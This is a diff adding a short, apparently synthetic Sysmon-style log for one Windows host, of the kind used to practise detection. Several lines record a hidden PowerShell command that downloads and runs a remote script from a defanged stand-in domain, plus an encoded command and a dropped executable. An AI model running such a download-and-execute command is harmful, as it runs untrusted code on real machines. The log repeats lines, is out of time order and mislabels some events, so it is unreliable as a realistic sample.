@@ -1,0 +1,15 @@
+2026-09-25 10:33:02 HOST01 Sysmon EventID=3 NetworkConnect DestinationIp=192.0.2.10 DestinationPort=443 Protocol=TCP
+2026-09-25 10:33:02 HOST01 Sysmon EventID=3 NetworkConnect DestinationIp=192.0.2.10 DestinationPort=443 Protocol=TCP
+2026-09-25 10:34:55 HOST01 Sysmon EventID=11 FileCreate FileName='C:\Users\Public\park-update.exe'
+2026-09-25 10:32:11 HOST01 Sysmon EventID=1 ProcessCreate Image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' CommandLine='poweshell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http[:]//malicious[.]domain/payload.ps1')'
+2026-09-25 10:32:11 HOST01 Sysmon EventID=1 ProcessCreate Image='powershell.exe' CommandLine='EncodedCommand: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
+2026-09-25 10:32:11 HOST01 Sysmon EventID=1 ProcessCreate Image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' CommandLine='poweshell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http[:]//malicious[.]domain/payload.ps1')'
+2026-09-25 10:32:11 HOST01 Sysmon EventID=1 ProcessCreate Image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' CommandLine='poweshell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http[:]//malicious[.]domain/payload.ps1')'
+2026-09-25 10:33:02 HOST01 Sysmon EventID=3 NetworkConnect DestinationIp=192.0.2.10 DestinationPort=443 Protocol=TCP
+2026-09-25 10:34:55 HOST01 Sysmon EventID=11 FileCreate FileName='C:\Users\Public\park-update.exe'
+2026-09-25 10:35:22 HOST01 Sysmon EventID=22 DNSQuery QueryName='secure-ops.net'
+2026-09-25 10:36:41 HOST01 Sysmon EventID=4688 NewProcess='cmd.exe' Parent='explorer.exe'
+2026-09-25 10:33:02 HOST01 Sysmon EventID=3 NetworkConnect DestinationIp=192.0.2.10 DestinationPort=443 Protocol=TCP
+2026-09-25 10:34:55 HOST01 Sysmon EventID=11 FileCreate FileName='C:\Users\Public\park-update.exe'
+2026-09-25 10:35:22 HOST01 Sysmon EventID=22 DNSQuery QueryName='secure-ops.net'
+2026-09-25 10:36:41 HOST01 Sysmon EventID=4688 NewProcess='cmd.exe' Parent='explorer.exe'
